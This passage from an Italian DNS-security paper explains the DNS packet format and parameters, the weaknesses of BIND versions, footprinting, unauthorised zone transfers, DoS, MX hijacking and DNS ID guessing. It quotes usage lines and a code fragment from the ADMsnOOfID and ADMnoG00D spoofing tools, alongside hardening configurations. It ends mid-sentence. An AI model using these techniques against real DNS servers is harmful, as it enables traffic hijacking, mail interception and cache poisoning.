|                                                                          |
|  0                            1                              3           |
|  0                            6                              2           |
|  ------------------------------------------------------------- <-        |
|  |      IDENTIFICATION        |             FLAGS            |  |        |
|  -------------------------------------------------------------  12       |
|  |    NUMBER OF QUESTIONS     |   NUMBER OF ANSWER RRs       | bytes     |
|  ------------------------------------------------------------- header    |
|  |  NUMBER OF AUTHORITY RRs   | NUMBER OF ADDITIONAL RRs     |  |        |
|  ------------------------------------------------------------- <-        |
|  \                        QUESTIONS                          /           |
|  -------------------------------------------------------------           |
|  /                        ANSWERS (variable num. of RRs)     \           |
|  -------------------------------------------------------------           |
|  \                        AUTHORITY (variable num. of RRs)   /           |
|  -------------------------------------------------------------           |
|  /                        ADDITIONAL (variable num. of RRs)  \           |
|  -------------------------------------------------------------           |
|                                                                          |
|  Il significato dei campi dovrebbe essere gia chiaro (requisiti..)       |
|  quindi non mi dilunghero'.                                              |
|                                                                          |
|  Il campo FLAGS di 16 bit e' suddiviso a sua volta in:                   |
|                                                                          |
|       0    0        0    0    0    0    0      1       1                 |
|       0    1        5    6    7    8    9      2       6                 |
|       --------------------------------------------------                 |
|       | QR | opcode | AA | TC | RD | RA | zero | rcode |                 |
|       --------------------------------------------------                 |
|                                                                          |
|  Il campo QUESTIONS contiene la query vera e propria ed e':              |
|                                                                          |
|                                                                          |
|  0                             1                             3           |
|  0                             6                             2           |
|  -------------------------------------------------------------           |
|  /                        QUERY NAME                         \           |
|  -------------------------------------------------------------           |
|  |       QUERY TYPE            |     QUERY CLASS             |           |
|  -------------------------------------------------------------           |
|                                                                          |
|                                                                          |
|  Il campi ANSWERS, AUTHORITY e ADDITIONAL condividono lo stesso          |
|  formato di pacchetto, detto appunto Resource Record (RR):               |
|                                                                          |
|                                                                          |
|  0                             1                             3           |
|  0                             6                             2           |
|  -------------------------------------------------------------           |
|  \                        DOMAIN NAME                        /           |
|  -------------------------------------------------------------           |
|  |         TYPE                |         CLASS               |           |
|  -------------------------------------------------------------           |
|  |                            TTL                            |           |
|  -------------------------------------------------------------           |
|  |    RESOURCE DATA LENGHT     |                             |           |
|  -------------------------------                             |           |
|  |                      RESOURCE DATA                        |           |
|  -------------------------------------------------------------           |
|                                                                          |
|                                                                          |
|  0x05 => Parametri DNS:                                                  |
|                                                                          |
|  Domain System CLASS:                                                    |
|                                                                          |
|    Valore   Nome                                    Riferimento          |
|  ---------  ----                                     ----------          |
|          0  Reserved                                     [IANA]          |
|          1  Internet (IN)                             [RFC1035]          |
|          2  Unassigned                                   [IANA]          |
|          3  Chaos (CH)                                [RFC1035]          |
|          4  Hesiod (HS)                               [RFC1035]          |
|      5-253  Unassigned                                   [IANA]          |
|        254  None                                        [Vixie]          |
|        255  Any [QCLASS Only]                         [RFC1035]          |
|  256-65534  Unassigned                                   [IANA]          |
|      65535  Reserved                                     [IANA]          |
|                                                                          |
|                                                                          |
|  Nella classe Internet (IN) troviamo:                                    |
|                                                                          |
|  TYPE     valore and significato                                         |
|                                                                          |
|  A           1 indirizzo host                         [RFC1035]          |
|  NS          2 dns server autoritativo                [RFC1035]          |
|  MD          3 ricezione mail (deprecato in favore MX)[RFC1035]          |
|  MF          4 mail forwarder (deprecato in favore MX)[RFC1035]          |
|  CNAME       5 canonical name per un alias            [RFC1035]          |
|  SOA         6 inizio zona State of Authority         [RFC1035]          |
|  MB          7 mailbox domain name (EXPERIMENTAL)     [RFC1035]          |
|  MG          8 mail group member (EXPERIMENTAL)       [RFC1035]          |
|  MR          9 mail rename domain name (EXPERIMENTAL) [RFC1035]          |
|  NULL        10 RR nullo (EXPERIMENTAL)               [RFC1035]          |
|  WKS         11 descrizione Well Known Service        [RFC1035]          |
|  PTR         12 domain name pointer                   [RFC1035]          |
|  HINFO       13 informazioni su un host               [RFC1035]          |
|  MINFO       14 informazioni su mail o mailing list   [RFC1035]          |
|  MX          15 mail exchange                         [RFC1035]          |
|  TXT         16 stringhe di testo                     [RFC1035]          |
|  RP          17 indirizzo responsabile sysdmin        [RFC1183]          |
|  AFSDB       18 AFS Data Base locatio n               [RFC1183]          |
|  X25         19 indirizzi X.25 PSDN                   [RFC1183]          |
|  ISDN        20 per indirizzi ISDN                    [RFC1183]          |
|  RT          21 per Route Through                     [RFC1183]          |
|  NSAP        22 indirizzi NSAP                        [RFC1706]          |
|  NSAP-PTR    23 NSAP pointer                                             |
|  SIG         24 eventuale security signature          [RFC2065]          |
|  KEY         25 security key                          [RFC2065]          |
|  PX          26 informazioni di mail mapping su X.400 [RFC2163]          |
|  GPOS        27 posizione geografica                  [RFC1712]          |
|  AAAA        28 indirizzo IPV6 (al posto di AA)       [Thomson]          |
|  LOC         29 informazioni localita'                  [Vixie]          |
|  NXT         30 next Domain                           [RFC2065]          |
|  EID         31 Identificatore Endpoint                [Patton]          |
|  NIMLOC      32 Nimrod Locator                         [Patton]          |
|  SRV         33 Server Selection                      [RFC2052]          |
|  ATMA        34 Indirizzo ATM                       [Dobrowski]          |
|  NAPTR       35 Naming Authority Pointer              [RFC2168]          |
|  KX          36 Key Exchanger                         [RFC2230]          |
|  CERT        37 CERT                                 [Eastlake]          |
|  TKEY        249 TKEY                                [Eastlake]          |
|  TSIG        250 Signature transazioni                  [Vixie]          |
|  IXFR        251 Trasferimento incrementale           [RFC1995]          |
|  AXFR        252 trasferimento di zona                [RFC1035]          |
|  MAILB       253 mailbox-related RRs (MB, MG o MR)    [RFC1035]          |
|  MAILA       254 mail agent RRs(deprecato a favore MX)[RFC1035]          |
|  *           255 richiesta di tutti i RR (come ANY)   [RFC1035]          |
|                                                                          |
|  Gli OPCODE sono i seguenti:                                             |
|                                                                          |
|   OpCode   Name                                     Referimenti          |
|  ------   ----                                       ----------          |
|       0   Query                                       [RFC1035]          |
|       1   IQuery                                      [RFC1035]          |
|       2   Status                                      [RFC1035]          |
|       3   reserved                                       [IANA]          |
|       4   Notify                                      [RFC1996]          |
|       5   Update                                        [Vixie]          |
|                                                                          |
|  GLI RCODE sono :                                                        |
|                                                                          |
|   RCode   Name                                      Riferimenti          |
|  ------   ----                                       ----------          |
|       0   NoError   No Error                          [RFC1035]          |
|       1   FormErr   Format Error                      [RFC1035]          |
|       2   ServFail  Server Failure                    [RFC1035]          |
|       3   NXDomain  Non-Existent Domain               [RFC1035]          |
|       4   NotImp    Not Implemented                   [RFC1035]          |
|       5   Refused   Query Refused                     [RFC1035]          |
|       6   YXDomain  Name Exists when it should not    [RFC2136]          |
|       7   YXRRSet   RR Set Exists when it should not  [RFC2136]          |
|       8   NXRRSet   RR Set that should exist does not [RFC2136]          |
|       9   NotAuth   Server Not Authoritative for zone [RFC2136]          |
|      10   NotZone   Name not contained in zone        [RFC2136]          |
|                                                                          |
|                                                                          |
|  0x06 => Tipologia di attacchi ai server dns:                            |
|                                                                          |
|  I server dns sono tra i server piu presi di mira dagli attacker di      |
|  skill medio fino ai piu' skillati, in quanto permettono senza           |
|  particolari difficolta' di fare molte cosette a volte anche di una      |
|  certa importanza e pericolosita'.                                       |
|                                                                          |
|  Si pensi ad una societa' di e-commerce famosa alla quale venisse        |
|  rediretto tutto il traffico in ingresso verso un'altra destinazione.    |
|  I danni a livello economico e di immagine sarebbero elevati!            |
|  La prima redirezione dovuta ad un'attacco di dns-poisoning fu ad        |
|  un societa' famosa...: www.internic.net, il quale traffico venne        |
|  rediretto verso www.alternic.net ad opera dell'hacker E. Kaspureff.     |
|                                                                          |
|  Occupandoci prevalentmente del daemon Bind,essendo il piu' presente     |
|  in rete ed uno dei migliori se ben gestito, diamo una occhiata alle     |
|  diverse versioni principali in modo da sapere se e' possibile           |
|  effettuare/ricevere un attacco e di che tipo.                           |
|                                                                          |
|  Le principali versioni di Bind sono:                                    |
|                                                                          |
|   Bind 4.x                                                               |
|    Considerata da molti la vera versione di Bind, e' ancora molto        |
|    presente in rete. Il codice e' stato sottoposto ad audit maggiore     |
|    rispetto alle altre versioni anche se non e' da considerarsi il       |
|    massimo della funzionalita'. Le ultime versioni contengono le         |
|    stesse patch della 8.x, ma il suo sviluppo e' ormai cessato.          |
|    Le versioni antecedenti la 4.9.6 e 4.9.6-p1 hanno il problema         |
|    di non verificare i record aggiunti nelle response dagli altri        |
|    name server (campo Additional Data).                                  |
|    Cosi' le info aggiuntive vengono inserite direttamente nella cache    |
|    in quanto ritenute utili.                                             |
|                                                                          |
|  - Bind 8.x                                                              |
|    Successore di 4.x apporta notevoli implementazioni comode ed utili    |
|    che, come sempre, in poco tempo hanno mostrato l'altro lato della     |
|    medaglia mostrando diversi problemi. Cio' vale per tutti i sistemi    |
|    che cercano in tutti i modi di diventare user-friendly..troppo.       |
|    (Ogni riferimenti a Windoze e' puramente casuale.. :)                 |
|    Questa versione supporta diverse opzioni di configurazione,           |
|    access list support,/etc/named.boot e' switchato a /etc/named.conf,   |
|    supporto dell'utilissimo ma altrettanto pericoloso DDns (Dynamic      |
|    dns) che permette aggiornamenti run.time tramite particolari packets, | 
|    ipv6 compliant, possibilita' di chrootarlo o chroot-jailarlo :=) etc. | 
|    Il sig. Theo Derat di openBSD e il suo team considerano il suo codice | 
|    troppo compplesso per essere analizzato bene, quindi ne sconsigliano  |
|    l'utilizzo. In ogno caso e' anch'esso uno dei piu' presenti in rete.  |
|    Le versioni antecedenti la 8.1.1 e 8.1.1-p1, oltre ad essere buggati  |
|    come la 4.x riguardo l'aggiunta di record nel campo Additional e a    |
|    presentare problemi di zone transfer se non posta in deny tramite le  |
|    apposite acl che vedremo piu' avanti nel paper, presenta problemi di  |
|    buffer overflow che, nel caso in cui sia in run come root...          |
|                                                                          |
|  - Bind 9.x                                                              |
|    L'ultima versione di Bind,ancora giovane e quindi poco usata sia per  |
|    motivi di "non c'ho voglia di fare l'upgrade, mi va bene cosi'", sia  |
|    per problemi di sicurezza che portano a deprecare l'uso di versioni   |
|    troppo nuove perche' sempre con qualche problema..                    |
|    Il codice e' stato praticamente riscritto, rimodellata l'architettura | 
|    per migliorarne la manutenzione, anche se sembra non aver migliorato  |
|    la leggibilita'.Questa versione ha le identiche feature della 8.x con | 
|    in aggiunta il supporto alle "dns-window" (che permettono di mostrare | 
|    differenti parti del dns a client diversi) e il supporto ai database, | 
|    nonche' altre migliorie di routine ai protocolli.                     |
|    Qualche versione non ha ancora risolto il problema di alcuni bug tra  |
|    cui quelli visti sopra, che nella maggior parte delle volte cmq sono  |
|    da attribuirsi alla "malagestione" da parte del sysadmin.             |
|    Qualcuno diceva:"Non ci son cattivi soldati,solo cattivi superiori".. | 
|    Di Bind 9.x e' stata scoperta ultimamente una vulnerabilita' che      |
|    consente di portare a termine un buffer overflow ed eseguire quindi   |
|    nella maggioranza dei casi codice arbitrario (vedremo dopo).          |
|                                                                          |
|  Ricordo per chi non ha domestichezza con i tools *nix etc.. che per     |
|  avere la versione di un server dns occorre eseguire il seguente         |
|  comando:                                                                |
|                                                                          |
|  $ dig -t txt -c chaos VERSION.BIND @server_dns                          |
|                                                                          |
|  Ora vedremo le diverse metodologie di attacco possibili ai dns, quindi  |
|  mi concentrero' su quello per il quale sto scrivendo questa paper.      |
|                                                                          |
|  -sub_A() DNS footprinting: {                                            |
|                                                                          |
|   Anche se non e' da considerarsi una tipologia di attacco e' sempre un  |
|   modo che l'attacker ha per estorcere informazioni utili da un server   |
|   DNS riguardo sotto-sistemi e configurazioni varie.                     |
|   Qui ci ci avvarremo di due tools compresi di default in ogni linux     |
|   distro: `host` e `nslookup`.                                           |
|                                                                          |
|   Intanto nel terz'ultimo paragrafo "DNS parameters" troverete appunto   |
|   la lista dei diversi parametri dello standard del protocollo dns che   |
|   comunque spero siano conosciuti (almeno i piu' utili).                 |
|                                                                          |
|   Metodi di raccolta di informazioni possono essere:                     |
|                                                                          |
|   $ nslookup www.sikurezza.org                                           |
|     server:  tin.it                                                      |
|     Address: 193.70.192.25                                               |
|                                                                          |
|     Non-authoritative answer                                             |
|     www.sikurezza.org     canonical name = sikurezza.org.                |
|                                                                          |
|     Name:    www.sikurezza.org                                           |
|     Address: 151.8.1.46                                                  |
|                                                                          |
|  Il tool nslookup viene considerato deprecato in quanto esistono altri   |
|  tools specifici di gestione dns, ma risulta sempre comodo e valido.     |
|                                                                          |
|   $ host www.sikurezza.org                                               |
|     www.sikurezza.org. in an alias for sikurezza.org                     |
|     sikurezza.org has address 151.8.1.46                                 |
|                                                                          |
|  Altre informazioni possono essere richieste settando come class type    |
|  il valore ANY (255):                                                    |
|                                                                          |
|   $ host -t ANY sikurezza.org                                            |
|     sikurezza.org. mail is handles by 10 sikurezza.org.                  |
|     sikurezza.org. has address 151.8.1.46                                |
|     sikurezza.org. name server ns1.sikurezza.org.                        |
|     sikurezza.org. name server ns2.sikurezza,org.                        |
|                                                                          |
|  Le info sopra riportate sono nella normalita' di una query.. i tipi     |
|  che non andrebbero settati in quanto non necessari e probabilmente      |
|  pericolosi sono HINFO e TXT, ed a volte anche RP.                       |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_B() DNS zone transfer: {                                           |
|                                                                          |
|   Una della grandi feature del protocollo dns e di Bind e' la            |
|   possibilita' di gestione della ridondanza tra server dns.              |
|   Come si sa, normalmente per ciascun dominio esiste un sistema          |
|   per la gestione del DNS primario; tutti gli altri sono secondari       |
|   e trasferiscono la zona DNS in caso di modifiche, e sono detti         |
|   server "slave". Per configurare un sistema come slave basta            |
|   inserire in /etc/named.conf (o /etc/named.boot se con bind 4.x)        |
|   cio' che segue:                                                        |
|                                                                          |
|   zone "pippo.com" {                                                     |
|              type slave; file "slave_pippo.com";                         |
|              masters { ip_dns_master; };                                 |
|                    };                                                    |
|                                                                          |
|   Questa sopra e' una tipica configurazione base, quindi non sicura.     |
|   Tant'e' che in caso di questa configurazione un attacker puo'          |
|   facilmente effettuare un trasferimento di zona senza neanche           |
|   montare un server Bind cercando di farlo passare come parte di         |
|   quella rete.                                                           |
|                                                                          |
|   $ host -t NS pippo.com                                                 |
|     pippo.com. name server ns1.pippo.com                                 |
|     pippo.com. name server ns2.pippo.com                                 |
|                                                                          |
|   $ host -l pippo.com ns1.pippo.com                                      |
|     pippo.com. name server ns1.pippo.com                                 |
|     pippo.com. name server ns2.pippo.com                                 |
|     www.pippo.com has address 192.168.1.1                                |
|     mail.pippo.com has address 192.168.1.2                               |
|     mailbk.pippo.com has address 192.168.2.2                             |
|     192.168.1.1.pippo.com domain name pointer mail.pippo.com             |
|     ftp_anon.pippo.com has address 192.168.1.3                           |
|                                                                          |
|   Chiaramente e' corretto lasciare la possibilita' ai dns secondari di   |
|   trasferire la zona aggiornando i relativi database. Ma e' anche certo  |
|   che per la nostra sicurezza non e' corretto lasciare che chiunque lo   |
|   faccia vedendo tutti i nostri indirizzi interni. Ad uopo soggiunge     |
|   una configurazione atta a non permettere il trasferimento di zona "to  |
|   anyone", facilmente intuibile grazie ai vari man di bind.              |
|   E' addirittura possibile impostare voci globali e quando necessario    |
|   sottovoci specifiche. Vediamo come:                                    |
|                                                                          |
|   options {                                                              |
|           ..snip..                                                       |
|           allow-transfer { ip_auth_1; };                                 |
|           };                                                             |
|                                                                          |
|   zone "pippo.com" {                                                     |
|              type master;                                                |
|              file "master_pippo.com";                                    |
|              allow-transfer { ip_auth_2; ip_auth_3;};                    |
|                    };                                                    |
|                                                                          |
|   zone "pippo.org" {                                                     |
|              type master;                                                |
|              file "master_pippo.org";                                    |
|                    };                                                    |
|                                                                          |
|   zone "pippo.edu" {                                                     |
|              type slave;                                                 |
|              masters { ip_masters; };                                    |
|              file "slave_pippo.edu";                                     |
|              allow-transfer { none; };                                   |
|                    };                                                    |
|                                                                          |
|   Con la precedente configurazione permettiamo:                          |
|                                                                          |
|   - pippo.org puo' effettuare un AXFR solo da ip_auth_1,date le globali. | 
|   - pippo.com puo' effettuare un AXFR solo da ip_auth_2 e ip_auth_3.     |
|   - pippo.edu NON effettuera' trasferimenti da nessuno.                  |
|                                                                          |
|   Nel caso un attacker chiedesse un AFXR illecito syslogd loggera'       |
|   tutto:                                                                 |
|                                                                          |
|   named[pid]: unapproved AFXR from [ip_attkr].port for "pippo.com" (acl) | 
|   named[pid]: unapproved AFXR from [ip_attkr].port for "pippo.org" (acl) | 
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_C() DNS Denial of Service: {                                       |
|                                                                          |
|  Ed eccoci arrivati al punto Denial of Service.. con i server DNS        |
|  i DoS sono implementati principalmente in due modi:                     |
|  - buffer overflow e dintorni                                            |
|  - ridirezioni nulle                                                     |
|                                                                          |
|  Sono molti, la maggior parte, gli exploit che sfruttano un buffer       |
|  overflow per ritornare una sh# o per eseguire un comando come root      |
|  o ancora per provocare un Denial of Service. Questo perche' non si      |
|  basano su errori della macchina, bensi' sugli errori dell'uomo          |
|  tradotti in coding errato e/o pericoloso, a volte per semplificare      |
|  alcune operazioni o per ridurre le linee di codice..a volte per         |
|  le troppe linee di codice che poi risultano difficili da anlizzare.     |
|                                                                          |
|  In Bind sono stati trovati buffer overflow per ogni versione            |
|  principale ma, essendo facilmente approfondibili in rete sui siti       |
|  opportuni qui non ne parleremo.                                         |
|  Diro' qualcosa invece su un problema di BO riscontrato nelle ultime     |
|  versione di Bind antecedenti la 9.2.1.                                  |
|                                                                          |
|  Questo problema risale a qualke giorno fa,precisamente al 04.06.2002    |
|  data CERT.                                                              |
|  Sono stati riscontrati vulnerabili 139 server su 1000 in USA (dati      |
|  Men & Mice) che "vestivano" la versione 9.x (ancora pochi).             |
|  Di questo bug non sono vulnerabili le versioni 4.x e 8.x.               |
|  Il bug consente ad un attacker di mandare in shutdown un server Bind    |
|  inviando un pacchetto specifico designato per far scattare un check     |
|  di consistenza interno. In ogni caso questo bug non consente di         |
|  eseguire codice o altro, ma solo di causare un down.                    |
|                                                                          |
|  Il problema che causa lo shutdown di Bind sovviene quando il parametro  |
|  "rdataset" della dns_message_findtype() contenuta in message.c non e'   |
|  NULL come atteso. La condizione fa si che il codice invii un error      |
|  message e chiami la abort().                                            |
|                                                                          |
|  Purtroppo i DNS configurati male che consentono attacchi di ogni tipo   |
|  sono ancora molti; vediamo una statistica effettuata da M :             |
|                                                                          |
|  Aziende USA con almeno 1 Bind vulnerabile (v.8.2.x prima di v.8.2.3)    |
|    01/30/01                33.30%                                        |
|    02/07/01                17.40%                                        |
|    02/13/01                13.80%                                        |
|    02/21/01                12.40%                                        |
|    03/28/01                 9.98%                                        |
|                                                                          |
|  Per i server autoritativi al TLD .com :                                 |
|    31 Jan '01     5500     40.27%                                        |
|    07 Feb '01     2200     16.73%                                        |
|    14 Feb '01     5000     11.77%                                        |
|    21 Feb '01     5500     13.10%                                        |
|    28 Mar '01     2000     10.30%                                        |
|                                                                          |
|  Come accennato prima, un altro problema che puo' portare ad un Dos      |
|  sono le ridirezioni nulle.                                              |
|  Si pensi ad esempio se per un portale importante come, ad esempio,      |
|  www.amazon.com si cambiasse la mappatura:                               |
|                                                                          |
|      amazon.com.  IN  A       207.171.83.16                              |
|      www          IN  CNAME   amazon.com.                                |
|                                                                          |
|  con la mappatura:                                                       |
|                                                                          |
|      amazon.com.  IN  A       ip_fittizio,nullo,o proprio                |
|      www          IN  CNAME   amazon.com.                                |
|                                                                          |
|  oppure la mappatura:                                                    |
|                                                                          |
|      amazon.com.  IN  A       207.171.83.16                              |
|      mail         IN  CNAME   amazon.com.                                |
|      amazon.com.  IN  MX      10 amazon.com.                             |
|                                                                          |
|                                                                          |
|  con la piu' pericolosa ai fini della privacy e non solo:                |
|                                                                          |
|      amazon.com.  IN  A       ip_attacker                                |
|      mail         IN  CNAME   amazon.com.                                |
|      amazon.com.  IN  MX      10 amazon.com.                             |
|                                                                          |
|                                                                          |
|  E' facile intuire che in questo modo tutte le mail inviate agli         |
|  appartenenti al dominio @amazon.com verrebbero inviate all'attacker     |
|  causando non pochi problemi di provacy, sicurezza etc. etc...           |
|  Volendo dirla tutta l'attacker potrebbe benissimo non essere scoperto   |
|  in breve tempo se approntasse con qualche riga di C un mail forwarder   |
|  che riceva le mail, ne faccia una copia, e le forwardi al vero ip       |
|  di amazon.com ...                                                       |
|  Le cose fattibili con i server DNS sono limitate solo dalla fantasia..  |
|                                                                          |
|  };                                                                      |
|                                                                          |
|  -sub_D() DNS ID guessing: {                                             |
|                                                                          |
|  Per ID guessing si intende la predizione dell'ID che contrassegna       |
|  una coppiata query/response, atta a stabilire una relazione tra di      |
|  essa e quindi evitare di utilizzare una response errata per una query   |
|  corretta. E' usata anche come sicurezza in quanto se un attacker        |
|  dovesse inviare una response a caso con i dati dell'attacco, questi     |
|  verrebbero ignorati per la mancata corrispondenza dell'ID.              |
|  Quindi preventivamente ad un attacco di dns spoofing/poisoning viene    |
|  spesso usata questa tecnica.La sintassi e' la medesima dell'ID guessing | 
|  (o ID prediction) dei pacchetti TCP al fine di portare a termine un     |
|  attacco di session hijacking o di man in the middle.                    |
|  Nel caso del DNS ID guessing la cosa e' piu' semplice, ma non sempre.   |
|  Normalmente (di default, e quindi per la maggior parte dei server) il   |
|  cambio dell'ID di un pacchetto dns avviene incrementalmente dal primo   |
|  inviato in avanti, quindi la prima query avra' (ad esempio) ID 1, la    |
|  seconda ID 2 etc...fino a raggiungere 65536, ovvero 16 bit (unsigned    |
|  short), per poi reiniziare il tour.                                     |
|  Il problema sorge nel momento in cui l'admin decide di hardenizzare     |
|  intelligentemente il server per evitarsi problemi.                      |
|  Tre modi di evitare l'ID guessing sono:                                 |
|  - l'adozione della patch dello SNI che permette di randomizzare l'ID;   |
|  - l'adozione di DNSSec;                                                 |
|  - l'adozione della patch dello SNI che permette di randomizzare l'ID;   |
|  - l'adozione di DNSSec;                                                 |
|  - l'adozione di Bind 9.x che adotta la randomizzazione di default.      |
|                                                                          |
|  Per controllare se un server e' vulnerabile basta inviare delle query   |
|  al server target (supponendo che il data flow sia sul proprio segmento  |
|  di rete) ed analizzare le query in uscita da esso per vedere se sono    |
|  predicibili.                                                            |
|                                                                          |
|  Le metodologie di predizione dell'ID sono sostanzialmente due, scelte   |
|  a seconda che l'attacker abbia o no una shell root su un server dns     |
|  autoritativo per la zona interessata (quindi per tizio.caio.edu avere   |
|  root su caio.edu, il SLD).                                              |
|                                                                          |
|  Supponiamo di avere una shell # sul dns server ns.medium.org che e'     |
|  autoritativo per il SLD medium.org e di voler probare il dns server     |
|  ns.vittima.edu (autoritativo per il SLD vittima.edu) per carpire se     |
|  e' o no vulnerabile all'ID guessing.                                    |
|  Quando usiamo il tool `nslookup' o 'host', il programma invia delle     |
|  query al server di default (/etc/resolv.conf) con il bit RD (recursion  |
|  desired) settato a 1. Il server di default inviera' quindi le query di  |
|  risoluzione per noi e ci ritornera' la risposta una volta trovata,      |
|  supponendo che non l'abbia gia in cache.                                |
|  Se l'avesse in cache saremmo gia scremati in partenza in quanto non ci  |
|  permetterebbe di vedere i pacchetti in uscita.                          |
|  Per questo motivo il comando corretto per iniziare l'ID guessing ad     |
|  alto livello e':                                                        |
|                                                                          |
|  attacker]$ nslookup host.medium.org ns.vittima.edu                      |
|                                                                          |
|  che ci permette di indicare al nostro resolver quale server usare per   |
|  iniziare una risoluzione ricorsiva.                                     |
|  In questo caso ns.vittima.edu inviera' per l'attacker una query a       |
|  ns.medium.org (che l'attacker ha in possesso) chiedendo di risolvere    |
|  un record A (type 1) per host.medium.org. L'attacker, essendo sulla     |
|  macchina (o sullo stesso segmento di rete) di medium.org, puo'          |
|  semplicemente attivare tcpdump per vedere l'ID del pacchetto ed altre   |
|  flags utili. Il formato di dump di tcpdump per le query DNS e':         |
|                                                                          |
|       src > dst: id op? flags qtype qclass name (len)                    |
|  es. ns.vittima.edu.1538 > ns.medium.org.53: 3+ A? host.medium.org. (33) | 
|                                                                          |
|  La sua interpretazione e':                                              |
|  from : ns.vittima.edu                                                   |
|  sport: 1538                                                             |
|  to   : ns.medium.org                                                    |
|  dport: 53                                                               |
|  ID   : 3                                                                |
|  type : A                                                                |
|  host : host.medium.org                                                  |
|  size : 33bytes                                                          |
|                                                                          |
|  La flag '+' dopo l'ID number indica il bit RD (recursion desired).      |
|  [ man tcpdump ]                                                         |
|                                                                          |
|  Supponiamo quindi di inviare piu' query consecutive,e di fare lo stesso | 
|  dal lato server compromesso e di avere questa situazione:               |
|                                                                          |
|  ns.vittima.edu.1538 > ns.medium.org.53: 3+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1539 > ns.medium.org.53: 4+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1540 > ns.medium.org.53: 5+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1541 > ns.medium.org.53: 6+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1542 > ns.medium.org.53: 7+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1543 > ns.medium.org.53: 8+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1544 > ns.medium.org.53: 9+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1545 > ns.medium.org.53: 10+ A? host.medium.org. (33)    |
|  ns.vittima.edu.1546 > ns.medium.org.53: 11+ A? host.medium.org. (33)    |
|                                                                          |
|  E' facile capire come per questo server sia facilmente predicibile l'ID | 
|  da allegare ad una possibile response falsa con i dati che vorremmo     |
|  aggiungere in cache.                                                    |
|  In una rete local basterebbe semplicemente rispondere subito alla query | 
|  prima del vero server utilizzando lo stesso ID e IP spoofato.           |
|  Ma cio' lo vedremo nei prossimi capitoli.                               |
|                                                                          |
|  Nel caso invece di :                                                    |
|                                                                          |
|  ns.vittima.edu.1538 > ns.medium.org.53: 22+ A? host.medium.org. (33)    |
|  ns.vittima.edu.1539 > ns.medium.org.53: 3+ A? host.medium.org. (33)     |
|  ns.vittima.edu.1540 > ns.medium.org.53: 253+ A? host.medium.org. (33)   |
|  ns.vittima.edu.1541 > ns.medium.org.53: 1828+ A? host.medium.org. (33)  |
|  ns.vittima.edu.1542 > ns.medium.org.53: 213+ A? host.medium.org. (33)   |
|  ns.vittima.edu.1543 > ns.medium.org.53: 99+ A? host.medium.org. (33)    |
|                                                                          |
|  sarebbe molto piu' complicato in quanto il server ns.vittima.edu sta    |
|  probabilmente usando la patch dello SNI o Bind 9.x (basta chiedere      |
|  un BIND.VERSION e se non e' 9.x significa che sta usando la patch).     |
|                                                                          |
|  A basso livello un programma che si occupa di questo (a dire il vero    |
|  implementa anche il poisoning) e', ad esempio, ADMsnOOfID di shok(ADM). | 
|                                                                          |
|  ADMsnOOfID usage:                                                       |
|  ADMsnOOfID &lt;device to spoof> &lt;NS victim> &lt;your domain> &lt;ip of your dns> | 
|  &lt;type (1,12)> &lt;spoof name> &lt;spoof ip> &lt;ns with auth on spoof ip/name>   |
|                                                                          |
|  Questa routine e' creata tramite invio di un pacchetto in questo modo:  |
|                                                                          |
|  <---from ADMsnOOfID.c---thanks to shok-;)--->                           |
|                                                                          |
|  /* make the question for get the ID */                                  |
|                                                                          |
|  sprintf(namefake,"%d%d%d.%s",myrand(),myrand(),myrand(),argv[3]);       |
|  dnssend->id      = 2600;                                                |
|  dnssend->qr      = 0;                                                   |
|  dnssend->rd      = 1;                                                   |
|  dnssend->aa      = 0;                                                   |
|  dnssend->que_num = htons(1);                                            |
|  dnssend->rep_num = htons(0);                                            |
|  i = makepaketQS(data2,namefake,TYPE_A);                                 |
|  udp_send(sraw, s_ipns, d_ip,2600+con, 53, buffer2, DNSHDRSIZE+i);       |
|                                                                          |
|  <---EoF-->                                                              |
|                                                                          |
|  la prima sprintf() crea un fakename di host tramite una implementazione | 
|  della rand() con base il SLD in possesso dell'attacker.                 |
|  A questo punto riempie i campi dell'header dns con rd=1, crea il campo  |
|  questions data del pacchetto con makepaketQS() sviluppata in ADMDNS.c   |
|  che sistema i campi a seconda che il type della query sia TYPE_A o      |
|  TYPE_PTR,quindi con la udp_send() contenuta in ADM-spoof.c costruisce   |
|  l'intero pacchetto aggiungendo header IP e UDP con IPPROTO_UDP e senda  |
|  tutto. Allo stesso tempo si attende la query di ritorno del server per  |
|  dumparne l'ID.                                                          |
|                                                                          |
|  la struct del pacchetto dns e' semplice ed e' la seguente:              |
|                                                                          |
|  struct dnshdr {                                                         |
|  unsigned short int id;                                                  |
|                                                                          |
|  unsigned char  rd:1;      /* recursion desired */                       |
|  unsigned char  tc:1;      /* truncated message */                       |
|  unsigned char  aa:1;      /* authoritive answer */                      |
|  unsigned char  opcode:4;  /* purpose of message */                      |
|  unsigned char  qr:1;      /* response flag */                           |
|                                                                          |
|  unsigned char  rcode:4;   /* response code */                           |
|  unsigned char  unused:2;  /* unused bits */                             |
|  unsigned char  pr:1;      /* primary server required (non standard) */  |
|  unsigned char  ra:1;      /* recursion available */                     |
|                                                                          |
|  unsigned short int que_num;                                             |
|  unsigned short int rep_num;                                             |
|  unsigned short int num_rr;                                              |
|  unsigned short int num_rrsup;                                           |
|  };                                                                      |
|                                                                          |
|  Ora analizziamo pero' il caso in cui l'attacker non sia cosi' fortunato | 
|  da possedere una sh root su un dns autoritativo per un TLD.             |
|                                                                          |
|  La metodologia utilizzata per far cio' e' una sorta di brute force di   |
|  response al server dns vittima per tentare di centrarne una. Si, non    |
|  e' un metodo elegante..per niente.. ma a volte riesce nel suo intento   |
|  senza sprecare troppa banda..                                           |
|                                                                          |
|  Un tool che fa questo e' ADMnOg00d, ancora del buon shok degli ADM.     |
|                                                                          |
|  Usage:                                                                  |
|  ADMnoG00D &lt;your ip> &lt;dns trust> &lt;domaine trust> &lt;ip victim> &lt;TYPE>      |
|  spoofname> &lt;spoof ip> &lt;ns.trust.for.the.spoof> [ID]                     |
|                                                                          |
|  L'attacker puo' comunque non difficilmente inviare qualke query al      |
|  server vittima per vedere all'incirca a che punto e' l'ID counter e     |
|  stare in quel range per le response. Questo tool e' definito dallo      |
